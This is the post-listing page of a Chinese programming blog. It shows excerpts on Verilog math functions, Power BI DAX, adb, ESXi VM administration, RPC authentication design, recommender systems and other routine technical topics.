<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f18545fa4b7f58e5971dde603bbf7485/" rel="bookmark">
			Verilog语法之数学函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Verilog-2005支持一些简单的数学函数，其参数的数据类型只能是integer和real型。
Integer型数学函数 $clog2是一个以2为底的对数函数，其结果向上取整，返回值典型的格式：
integer result;
result = $clog2(n);
最典型的应用就是通过参数化的方式来求某个变量的位宽，在另一篇文章已经对用法做了详细的介绍：Verilog设计中如何匹配变量的位宽？（$clog2系统函数）
Real型数学函数 其参数数据类型为real型，返回值同样为real型，这意味着下面这些数学函数都无法被综合：
FunctionDescription$ln(x)N自然对数（以e为底的对数）$log10(x)十进制对数（以10为底的对数）exp(x)e^x ，e=2.718281828...sqrt(x)开平方$pow(x, y)x^y$floor(x)向下取整$ceil(x)向上取整$hypot(x, y)sqrt(xx + yy)。对两个数平方和开平方$sin(x)sin$cos(x)cos$tan(x)tan$asin(x)arcsin$acos(x)arccos$atan(x)arccos$atan2(x, y)x/y的反正切$sinh(x)双曲正弦$cosh(x)双曲余弦$tanh(x)双曲正切$asinh(x)反双曲正弦$acosh(x)反双曲余弦$atanh(x)反双曲正切 写个简单的testbench到modelsim验证一下：
module tb_math_fuc; real x, y;	//这些函数的参数需要是real类型，返回也是real类型 initial begin	//0.3f表示取小数点后3位，下同 x = 10000;$display("$log10(%0.3f) = %0.3f", x, $log10(x));	//以10为底的对数	x = 1;$display("$ln(%0.3f) = %0.3f", x, $ln(x));	//以e为底的对数 x = 2;$display("$exp(%0.3f) = %0.3f", x, $exp(x));	//e^x x = 25;$display("$sqrt(%0.3f) = %0.3f", x, $sqrt(x));	//开平方 x = 5;y = 3;$display("$pow(%0.3f, %0.3f) = %0.3f", x, y, $pow(x, y));	//x^y x = 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f18545fa4b7f58e5971dde603bbf7485/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a03ba4dd1ed62a8b48e22024038abdf/" rel="bookmark">
			Power BI 筛选器函数---Window实例详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Window函数
语法：
Window ( &lt;起始位置&gt;,&lt;起始位置类型&gt;,&lt;结束位置&gt;,&lt;结束位置类型&gt;, [&lt;关系&gt;], [&lt;OrderBy&gt;],[空白],[PartitionBy] )
含义：
对指定分区（PartitioinBy)中的行（关系表），按指定的列进行排序（OrderBy）后，根据（起始位置）和（结束位置）定位多行。
参数：
参数
属性
描述
起始位置
ABS时，1代表第1行，-1代表最后1行；REL时，-1代表上一行，0代表当前行，1代表下一行
起始位置类型
可选
ABS（绝对）和 REL（相对），默认为 REL
结束位置
ABS时，1代表第1行，-1代表最后1行；REL时，-1代表上一行，0代表当前行，1代表下一行
结束位置类型
可选
ABS（绝对）和 REL（相对），默认为 REL
关系表
可选
表表达式，要包含第3、第5个参数中用的列
OrderBy
可选
排序依据，如省略，第二个参数须指定
空白
可选
保留的参数位置，暂时无用
PartitionBy
可选
分区依据如果省略，视同只有一个分区
备注：
OrderBy、PartitionBy中出现的列，需要先在“关系表”中引用。
二、实例
已知表：日期表和表：销售记录（2020年~2022年），
表：日期表
表：销售记录（2020年~2022年）
生成月度销售金额报表
1、新建度量值，销售金额 = SUM('销售记录'[金额])
2、新建度量值，window(-1REL,1REL) = CALCULATE('度量值表'[销售金额],WINDOW(-1,REL,1,REL,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位当前行上一行至当前行下一行（-1,REL,1,REL）
3、新建度量值，window(1ABS,-1ABS) = CALCULATE('度量值表'[销售金额],WINDOW(1，ABS，-1，ABS,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位第一行至最后一行（1,ABS,-1,ABS）
4、新建度量值，window(0REL,-1ABS) = CALCULATE('度量值表'[销售金额],WINDOW(0,REL,-1,ABS,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位当前行至最后一行（0,REL,-1,ABS）
5、新建度量值，window(1ABS,0REL) = CALCULATE('度量值表'[销售金额],WINDOW(1,ABS,0,REL,ALLSELECTED('日期表'[年],'日期表'[月]),ORDERBY('日期表'[月],ASC),,PARTITIONBY('日期表'[年])))
解析：以‘日期表’[年]作为分区，按‘日期表’[月]进行升序排列，然后定位第一行至当前行（1,ABS,0,REL）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c5714658fe34ffa8206f805faab55af/" rel="bookmark">
			使用ADB命令卸载软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		若要使用 ADB 命令卸载软件，您可以在命令行/终端中执行以下命令：
adb uninstall &lt;package name&gt; 其中 &lt;package name&gt; 是您想要卸载的软件的包名。
例如，若要卸载名为 com.example.app 的软件，您可以执行：
adb uninstall com.example.app 请确保您的设备已连接到电脑，并已启用 USB 调试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df874d6029d58fd2a567c97f79256055/" rel="bookmark">
			如何使用python调用MATLAB编写的算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 提示：虽然MATLAB可以导出C++代码,但是这里还是建议用户导出C代码,利用ctype转换比较方便些：
本文主要讲解MATLAB的代码导出C代码xx.h文件和xx.c文件代码。如果将这些代码打包成一个so文件(ubuntu平台)。利用python自带ctypes创建数据调用转换后的so文件代码。
一、MATLAB代码 function a = array_output(n) %$codegen if n &gt; 2*pi a = 1:n; else a = [1,2,3]; end end 代码就是判断n的值和2Pi比较，如果n&gt;2pi就输出[1,n]的值,否则就输出[1,2,3]。这部分很简单。不是本文的额重点。
二、MATLAB代码导出C/C++ 1.数据的解释分析 这部分的话请参考其他的博客,导出代码方法不在赘述,但是注意一点,本文是针对C代码接口写的,所以建议还是直接导出C使用
如果你导出C++将会有cpp文件并且有一个code_array.h头文件. 这个是一个矩阵库的C++表示形式,这里用到了类的方式,由于python自带的ctypes处理C++非常的不方便因此这里我们使用C的结构体
template &lt;typename T, int N&gt; class array : public array_base&lt;T, SizeType, N&gt; { private: typedef array_base&lt;T, SizeType, N&gt; Base; public: array() : Base() { } array(const array&lt;T, N&gt;&amp; _other) : Base(_other) { } array(const Base&amp; _other) : Base(_other) { } array(T* _data, const SizeType* _sz) : Base(_data, _sz) { } }; C语言的头文包如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df874d6029d58fd2a567c97f79256055/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67b75157686f33c8c1e3d1c8176a721f/" rel="bookmark">
			【CSP真题练习】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		202209 1.如此编码 #include&lt;iostream&gt; using namespace std; int n; int a[30] = { 0 };//选项个数 long long m;//神秘数字 int b[30] = { 0 }; long long c[30] = { 0 }; int main() { //首先输入 cin &gt;&gt; n &gt;&gt; m; c[0] = 1;//初始化 for (int i = 1; i &lt;= n; i++) { cin &gt;&gt; a[i];//选项个数 c[i] = c[i - 1] * a[i];//初始化，前缀积 } long long num = 0;//用来减去已经计算出来的数字 for (int j = 1; j &lt;= n; j++) { b[j] = (m % c[j] - num) / c[j - 1]; num += b[j] * c[j - 1]; } for (int k = 1; k &lt;= n; k++) { cout &lt;&lt; b[k] &lt;&lt; ' '; } return 0; } 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67b75157686f33c8c1e3d1c8176a721f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65c62beccb88d8ddfc5c24db97ce1d18/" rel="bookmark">
			利用python自动将下载好的音视频合成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网上看到一个油猴脚本，可以自动下载任何视频，下载后自动生成音频和视频，需要用到ffmpeg对音视频进行合成，于是花了几个小时写了一个python脚本，实现自动扫描并合成视频功能
使用此脚本前，您可能需要配置如下清单
安装油猴脚本
安装无限制下载视频脚本：https://greasyfork.org/zh-CN/scripts/445751-unlimited-downloader
下载ffmpeg音视频合成工具
配置下载目录和ffmpeg目录，分别是脚本中的两个变量：download_dir，ffmpeg_dir
完成上述配置后，即可享受无限制的视频下载及合成
import os import tkinter as tk import tkinter.messagebox def alert_success(): if (tk.messagebox.askquestion(title='提示', message='合并完成，是否打开下载文件夹?') == 'yes'): output_dir = r'C:\Users\Administrator\Downloads' os.system("explorer.exe %s" % output_dir) def trim_file(file_name): if isinstance(file_name, str): if file_name.startswith('audio') or file_name.startswith('video'): if ' ' in file_name: rename = file_name.replace(' ', '') print('清除文件名中的空格', file_name) os.rename(download_dir + '\\' + file_name, download_dir + '\\' + rename) return rename return file_name def scan_download_dir(download_dir): dict1 = {} g = os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65c62beccb88d8ddfc5c24db97ce1d18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcfc4a20ca8d17eb04d1f16e62cf091c/" rel="bookmark">
			计算机专业实习生一般做什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般来说，计算机专业实习生会承担一些与他们专业相关的任务，如：
软件开发：参与软件项目的开发，解决问题并完成任务。
技术支持：帮助用户解决技术问题，提供技术支持。
数据分析：分析和处理数据，提供有关数据的报告。
网络管理：维护和管理网络设备，保证网络的稳定性。
测试：测试软件的性能和功能，确保软件的质量。
不同的公司和项目会有不同的要求，但是以上是一些常见的实习生任务。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5a79ba50c6d13b2c780a4b4aa6687d1/" rel="bookmark">
			正常关闭电源失效，强行关闭虚拟机电源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 三种方法，可以任选一种执行操作。
1、后台开启Troubleshooting options，使用Alt+F1登录，或者使用SSH工具登录，查看进程
ps | grep vmx | more # 如果知道虚拟机名可以直接grep vmname 杀死进程
kill -9 pid 2、获取所有虚拟机信息(vimid)
vim-cmd vmsvc/getallvms 关闭，打开，重启虚拟机
vim-cmd vmsvc/power.off vimid #关闭虚拟机 vim-cmd vmsvc/power.on vimid #打开虚拟机 vim-cmd vmsvc/power.reset vimid #重启虚拟机 vim-cmd vmsvc/power.getstate vimid #获取虚拟机状态 3、esxcli命令
esxcli vm process list #获取正在运行的虚拟机信息 注意：关闭虚拟机，有三种关机方法可供使用，三种模式soft/hard/force。软关机soft是正常关机，硬关机hard是立即关机，强制关机force则应在不得已的情况下使用。
esxcli vm process kill --type= [soft,hard,force] --world-id= WorldNumber 备注：kill虚拟机需要点时间，耐心等待。
如上图，要关闭vc7-1虚拟机，执行如下命令即可。
esxcli vm process kill --type=soft --world-id=38813731 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17a86503ca4bda3bf3b4b49c35409c54/" rel="bookmark">
			VMware详细的网络配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在VMware中网络连接中主要存在三种网络模式，分别是：桥接模式、NAT模式、仅主机模式。下面分别来讲这三种模式理解和配置方法。
1 桥接模式
设置了桥接模式的虚拟系统与主机是同一层次的关系，相当于虚拟系统与主机共同处于同一个交接机或Hub下的两台电脑。具体如图（图片来源：https://blog.csdn.net/santirenpc/article/details/96132840）
通常使用VMnet0网卡，要求虚拟机IP与主机的IP在同一网段且同一子网，网关与DNS也要与主机一致。主要设置如下，这里以kali系统为例。
2 NAT（网络地址转换）模式
NAT模式中VMware相当于虚拟出一个交换机，并且组成一个虚拟内网，主机与虚拟系统都在内网中，虚拟系统要访问网络需要经过虚拟交换机转换后经主机与外界通信。具体见图片。
NAT模式主要用VMnet8虚拟网卡，主要设置如下：
要想设置子网IP，需要先设置主要的IP后才可以设置
这样主机与虚拟系统就可以通信与对外访问。
3 仅主机模式
仅主机模式，虚拟机处于隔离状态，仅主机可与外界连接，虚拟机可连接主机，但无法连接外部网络。具体网络结构见图片
仅主要模式通常使用VMnet1虚拟网卡，具体设置如下。
子网IP设置也是需要先在主机上设置虚拟网卡的IP后，再进行设置。虚拟系统仅可与主机通信无法联网。
以上就是VMware常用的三种网络连接模式，如有描述的不清楚的或疑问点可联系，有问必答。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c756219499d11a12f79613ab0abe29a9/" rel="bookmark">
			交叉熵损失函数的计算公式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		交叉熵损失函数的计算公式如下:
对于二分类问题：
L = -(ylog(p) + (1-y)log(1-p))
其中：L为交叉熵损失函数的值，y为真实标签(0或1)，p为模型预测为正类的概率。
对于多分类问题：
L = -∑y_ilog(p_i)
其中：L为交叉熵损失函数的值，y_i为真实标签，p_i为模型对第i类的预测概率。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7647208e0f5e9717522421d07108e31/" rel="bookmark">
			ChatGPT (可能)是怎么炼成的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习自李宏毅老师的课https://www.youtube.com/watch?v=e0aKI2GGZNg
1.学习文字接龙 学习方式 GPT只需要在网上阅读大量的句子，不需要人工标注即可学习到大量句子接龙的知识
然而实际上，“你好”后面可以接的字有很多。实际上，GPT学的就是一个“概率分布”。然后按照概率分布，选一个字出来。比如下图中，“美”的出现概率就很高。
句子接龙的作用 实际上，学会了句子接龙，就可以回答一些问题。
比如下面这个问题，就可以变成“台湾最高的山是”，这个空缺的句子，然后让GPT去接龙。
然而这样是有缺陷的，比如它在网上恰好看到了一个地理试卷…
那么“GPT给你出了一道地理题”这种情况也是有可能发生的。
2.人类老师引导文字接龙方向 由人类来标注这些接龙的可能答案，以及限定GPT读取网上的内容。
不需要穷举标注所有答案，只需要告诉GPT人类的希望它生成的答案类型。
3.模仿人类老师的喜好 openAI开放了它的GPT API，所有人都可以直接调用。而GPT对问题的答案具有随机性，这时调用它的用户就充当了人类老师的作用。通过用户的反馈，openAI就知道人类更希望它产生那个答案。
比如点击上图的那个“Regenerate response”，就相当于告诉它人类对此类回答不满意。
接下来用这些数据训练一个“模仿人类老师”的模型Teacher Model，用这个模型来给chatGPT的回答打分。
4.用增强学习像模拟老师学习 当有人问出“世界上最高的山是那座？”的时候，GPT可能生成了一个“世界上最深的海又在哪里？”。这对于句子接龙来说，显然是个非常好的结果，但是对于问问题的人来说显然并不是:(。那么GPT会先把这个结果送给Teacher Model来打分。
那么理想情况下Teacher Model应该会给低分，这个低分就相当于增强学习中的Reward。这时就根据增强学习技术，去调整GPT生成回答的参数，以此尽量来获得高分。
经过多次调整后，GPT就会大概率生成人类想要它输出的答案了
GPT的缺陷 如何找到GPT的缺陷？
比如说问一些没用的问题，此类问题缺少人类老师的引导，那么GPT就有很大的可能性会答错。
比如这下直接给GPT干懵了:)。
总结 chatGPT就是GPT的社会化！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73b3dedbcffda4504bce01c8c38d1526/" rel="bookmark">
			T35,没有token是什么意思？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		描述 输入一个升序数组 array 和一个数字S，在数组中查找两个数，使得他们的和正好是S，如果有多对数字的和等于S，返回任意一组即可，如果无法找出这样的数字，返回一个空数组即可。
数据范围: 0≤len(array)≤105​​ 0≤len(array)≤105​​ ， 1≤array[i]≤106 1≤array[i]≤106 示例1 输入：
[1,2,4,7,11,15],15 返回值：
[4,11] 说明：
返回[4,11]或者[11,4]都是可以的 示例2 输入：
[1,5,11],10 返回值：
[] 说明：
不存在，返回空数组 示例3 输入：
[1,2,3,4],5 返回值：
[1,4] 说明：
返回[1,4],[4,1],[2,3],[3,2]都是可以的 示例4 输入：
[1,2,2,4],4 返回值：
[2,2] 实现代码:
import java.util.*; public class Solution { public ArrayList&lt;Integer&gt; FindNumbersWithSum(int [] array,int sum) { ArrayList&lt;Integer&gt; a=new ArrayList&lt;Integer&gt;(); for(int i=0;i&lt;array.length;i++){ for(int j=i+1;j&lt;array.length;j++){ if(array[i]+array[j]==sum){ a.add(array[i]); a.add(array[j]); return a; } } } return a; } } 时间复杂度：O（N^2）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73b3dedbcffda4504bce01c8c38d1526/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bf1351bea57142d5891375e747cc2f8/" rel="bookmark">
			蓝桥杯嵌入式G4-LCD显示屏的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理图 CubeMX配置 也可直接引用官方例程的LCD初始化函数，不需要配置。
keil代码 首先将官方例程中的几个程序加入到创建的文件夹中
头文件引用
#include"led.h" #include"lcd.h" #include"stdio.h" LCD_Init();//LCD初始化 LCD_Clear(Black); LCD_SetBackColor(Black); LCD_SetTextColor(White); /* USER CODE END 2 */ /* Infinite loop */ /* USER CODE BEGIN WHILE */ while (1) { /* USER CODE END WHILE */ /* USER CODE BEGIN 3 */ for(uchar i=0;i&lt;8;i++) { led_disp(0x01&lt;&lt;i); char text[30]; sprintf(text,"LED:%d ",i+1); LCD_DisplayStringLine(Line4,(uint8_t *)text); HAL_Delay(500); } } 实现效果为跑马灯，LCD显示第几个灯亮
常见函数 //在某一行的第i列显示一个字符 LCD_DisplayChar(Line0,320-(16*i),'*'); 高亮显示 //str为需要显示的字符串 //pos为需要高亮显示的字符位置 //color为需要高亮显示的颜色 void highlight(char *str,uchar pos,uint color) { uchar i=0; LCD_SetBackColor(Black); for(i=0;i&lt;20;i++) { if(i!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bf1351bea57142d5891375e747cc2f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31e3d2e34a32612dc9310b567f0f142e/" rel="bookmark">
			RPC框架设计的安全性考量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RPC里面该如何提升单机资源的利用率，你要记住的关键点就一个，那就是“异步化”。调用方利用异步化机制实现并行调用多个服务，以缩短整个调用时间；而服务提供方则可以利用异步化把业务逻辑放到自定义线程池里面去执行，以提升单机的OPS。
1 为何要考虑安全问题？ RPC是解决应用间互相通信的框架，而应用之间的远程调用过程一般不会暴露在公网，RPC一般用于内部应用通信。
“内部”指应用都部署在同一大局域网。相对公网环境，局域网隔离性更好，相对安全，所以在RPC里很少考虑数据包篡改、请求伪造等。
那RPC里应关心什么安全问题？
2 完整的RPC应用流程 先由Provider定义好一个接口，并把这个接口的Jar包发布到私服，然后在项目中实现这接口，最后通过RPC API把这接口和其对应实现类完成对外暴露，若是Spring应用，直接定义成一个Bean即可。至此，服务提供方就完成了一个接口的对外发布。
对服务调用方就更简单，只要拿到刚才上传到私服的Jar坐标，就可把发布到私服的Jar引入项目，借助RPC动态代理功能，服务调用方直接就可在项目完成RPC调用。
安全隐患 因为私服上所有Jar坐标所有人都可看到，只要拿到Jar坐标，就可将发布到私服的Jar引入项目，完成RPC调用了吗？公司内部这种不向服务提供方咨询就直接调用的行为很少发生，一般真实业务的接口出入参数都不太简单，这样不经过咨询只靠调用方自己猜测完成调用的工作效率实在太低。
虽然这种靠猜测调用的概率很小，但当调用方在其它新业务场景要用之前项目中使用过的接口，很可能真的不跟服务提供方打招呼就直接调用。这行为对Provider很危险，因为接入新调用方就意味着承担的调用量变大，有时可能新增的调用量会成为Provider的“最后一根稻草”，导致Provider无法正常提供服务，还不知道是被谁给压垮的。
可通过公司严格流程让研发达成“君子约定”，即在应用里每次要用一个接口时，须先向服务提供方报备，这确实能在很大程度避免。但就RPC本身，可提供某种功能来解决这种问题呢？毕竟对人数多的团队，口头约定不能彻底杜绝这类问题。
3 调用方之间的安全保证 根本原因就是服务提供方收到请求后，不知道这次请求是哪个调用方发起的，没法判断这次请求是属于之前打过招呼的调用方还是没有打过招呼的调用方，所以也就没法选择拒绝这次请求还是继续执行。
只需给每个调用方设定一个唯一身份，每个调用方在调用前都先来服务提供方这登记身份，只有登记过的调用方才能继续放行，没有登记过的调用方一律拒绝。
好比坐火车凭身份证购买火车票，买票成功就类似服务调用方去服务提供方进行登记。当你进站准备上火车，须同时出示你的身份证和火车票，这两个就是代表你能上这趟火车的“唯一身份”，只有验证身份，负责检票的工作人员才会让你上车，否则拒乘。
4 RPC里的实现 先要有个可供caller进行调用接口登记的地方，“授权平台”，caller可在授权平台上申请自己应用里要调用的接口，而provider在授权平台进行审批，只有服务提供方审批后调用方才能调用。但这解决调用数据收集的问题，并没有完成真正授权认证功能，缺少一个检票环节。
搭建了授权平台，而且接口的授权数据也在这平台，可将检票环节放到授权平台。caller每次发起业务请求时，先去发一条认证请求到授权平台：“hello，我能调用这个接口吗？”
只有授权平台返回：“sure”，才继续把业务请求发到provider。
4.1 集中式认证流程 @startuml title:集中式认证流程 participant 调用方 as 调用方 participant 授权平台 as 授权平台 participant 提供方 as 提供方 调用方 -&gt; 授权平台++ : 我们调用 x 接口吗？ 授权平台 --&gt; 调用方-- : sure！ 调用方 -&gt; 提供方++ : 真实业务请求 提供方 --&gt; 调用方-- : 返回结果 @enduml 这种设计没问题，整个认证过程对RPC使用者透明。问题是这授权平台承担公司内所有RPC请求的次数总和，当公司内部RPC使用程度高了，这授权平台就会成为性能瓶颈，须保证高可用。
如何优化呢？是否不需要把这认证逻辑放到业务请求过程，而是挪到初始化过程？确实可很大程度减少授权平台压力，但本质无变化，还是集中式授权平台。
5 更优方案 caller能否调相关接口，由provider说了算，就可将检票过程放到provider。在caller启动初始化接口时，带上授权平台上颁发的身份去provider认证下，当认证通过后，就认为这接口可调。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31e3d2e34a32612dc9310b567f0f142e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62cde3efc69d5522f182959844a0d380/" rel="bookmark">
			推荐系统中可能遇到的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用用户的 user ID 特征，需要用户非常多的行为才会使其收敛不稳定的网络会导致 Embedding 效果变差，由于业务场景下短视频的冷启动问题非常严重，Embedding 的质量至关重要； embedding 空间需要对齐：在不同业务下，embedding 的空间分布存在差异。可以把当前用户来自于不同业务的差异作为特征来学习一个gate映射网络来直接学习这种映射关系，然后直接对输入层进行映射。特征重要性需要对齐：一些特征在不同业务下的重要性是不一样的。例如 Click 模型在双列产品上非常重要，但是在上下滑就不太重要。需要针对不同的业务用户视频来学习特征级别的重要性。使用 Target Attention 来替换 transformer self attention 部分，发现 self attention相对于 Target Attention 并没有显著的收益，但是计算量非常大。以此替换可以降低计算的复杂度。使用视频观看时间戳取代 position embedding。短期行为序列建模希望模型更关注近期的观看历史行为。借鉴 DIN 中介绍的 adaptive l2 regularization 的方式，挑选了一批类似用户id这种高维稀疏 id 类特征做动态正则。对正则系数做适当调整后，模型训练正常，全量数据过 5 个 epoch 也不会出现过拟合现象。 对于序列特征中的poi并不是考虑越多的属性效果会更好，选择的属性需要覆盖度高，不然序列中太多的属性默认值会导致模型训练不佳。 一个字符串的序列 user_click_seq =[ [“6,5,4,3,2,1”] [“10,9,8,7,6,5,4,3,2,1”]] 切分之后会得到一个sparse类型的tensor
sparse_tensor = tf.string_split(user_click_seq, ',')
fea = tf.SparseTensor(sparse_tensor.indices, tf.string_to_number(sparse_tensor.values, tf.int64), sparse_tensor.dense_shape)
主要包含三个信息，存放值的index、具体的值、展开之后shape，这里的shape是一次输入模型时的最大shape，离线训练是一个batch里最大的，线上预估是这个人最大的，这里就可能出现数据线上线下不一致的问题。
离线训练时 tf.sparse_tensor_to_dense(fea, default_value=0) 会填充默认值，将SparseTensor扩充成一个batch最大的维度的Tensor，[ [6,5,4,3,2,1,0,0,0,0] [10,9,8,7,6,5,4,3,2,1]] ,如果有其他操作，离线训练时是没问题的，因为保证了shape一致，但是线上预估的时候，[ [“6,5,4,3,2,1”] [“6,5,4,3,2,1”]]，会被切分为[ [6,5,4,3,2,1] [6,5,4,3,2,1]]，因为是同一个user，这里的最大shape是一样的，所以会产生离线训练 长度为10，线上预估长度为6 ，10 !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62cde3efc69d5522f182959844a0d380/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eafdf51a38fd4cf3cabf1f4bdf9bf1ae/" rel="bookmark">
			Visual Studio和VS Code的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Visual Studio简介：
是一个集成开发环境--IDE，安装完成后就能直接用，编译工具，调试工具，各个语言的开发工具，都是已经配置好的，开箱即用。适用于macOS/Windows
2.VS Code简介：
是一个开源的、高性能的、轻量级的代码编辑器。但VS Code又比一般的编辑器功能丰富，可以理解为：VS Code的体量介于编辑器和IDE之间，并且可以做到跨平台(macOS/Windows/Linux)。
VS Code内置了对Node.is、TypeScript和javaScript的支持，如果这些还不够，可以安装拓展轻松添加对
C++/C#/JAVA/Python/Go/PHP等不同语言的支持，以及运行时的环境(比如.NET和Unity)
3.Visual Studio和VS Code选择哪个
a.前端开发(JavaScript编程语言为主)，可以将VS Code作为主力开发工具；
b.做其他语言方向的开发，并且不需要太复杂的集成开发环境，可以把VS Code作为代码编辑器来用
c.大项目关联复杂，模块众多调试复杂，那VS可能更合适，如果短时间开发，VS Code可能更好
两个产品都是微软的产品，很多优秀的功能都会在两个产品中不断更新，导致两个产品之间越来约接近，越来越完善，而且两者的边界越来越模糊，有点类似QQ与微信的区别，所以没有严格的边界之分，VS Code和Visual Studio都支持语言的日常开发/调试/测试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee1fe124f22ff4e4f7f4f74e0dce5a2e/" rel="bookmark">
			制造企业产品成本核算功能设计实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		制造企业产品成本核算是成长控制、成本决策、销售决策的基础。如何快速、准确地完成成本核算，是企业应用中的高级部分，是在存货管理已经正常进行，已经做到账实一致、及时反映、信息完善的前提下才能进行的，还要有及时的会计总账核算结果（期间费用等），在充分 满足一些基础条件后，就可以开展成长核算的业务处理了。本例基于存货总线概念，是整套ERP系统中的一个组成部分，核算结果可直接用于成本控制和成本决策。本文讲述业务逻辑及后台编程。
一、确定成本核算对象：成本核算单 1、成本核算单需要填制、审核、登记。成本核算单是成本核算目标对象，可以直接填制所有成本核算单，不必等到前面的核算完成再填制后面的。
2、成本核算单主要核算对象包括：外协物料、半成品物料、产成品物料。
3、本例分为四个阶段：外协品、初级半成品（机箱）、二级半成品（祼机）、产成品。
4、其中，外协品只分配发出的材料（直接材料）。不分配人工及制造费用。
5、初级半成品分配直接材料、直接人工、制造费用（钣金车间）。
6、二级半成品分配直接材料、直接人工、制造费用（组装车间）。
7、产成品分配直接材料、直接人工、制造费用（检测车间）、管理费用。
8、本例共填制四张成本核算单，来自于委外入库数据和三个车间的完工入库数据。
9、产品入库时，已经按计划价格入库，因此在查询时是可以看到价格的，成本核算时将替换原有一价格，核算不正确时，可以重复进行，直到正确为止。
